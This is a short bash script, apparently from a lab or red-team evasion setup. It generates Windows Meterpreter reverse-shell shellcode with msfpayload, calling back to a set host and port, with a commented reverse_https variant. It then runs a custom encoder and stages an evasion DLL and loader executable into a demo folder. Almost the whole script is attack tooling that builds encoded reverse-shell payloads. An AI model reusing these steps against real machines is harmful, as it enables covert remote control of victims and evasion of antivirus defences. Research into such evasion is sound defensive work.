#!/bin/bash
#msfpayload windows/meterpreter/reverse_https LHOST=www.testbox.com LPORT=443 C > ~/test.c
msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=8443 C > ~/test.c
python ./funcencode.py
rm ~/demo/testa.dll
rm ~/demo/loadera.exe
cp /tmp/evasion/testa.dll ~/demo/
cp /tmp/evasion/loadera.exe ~/demo/
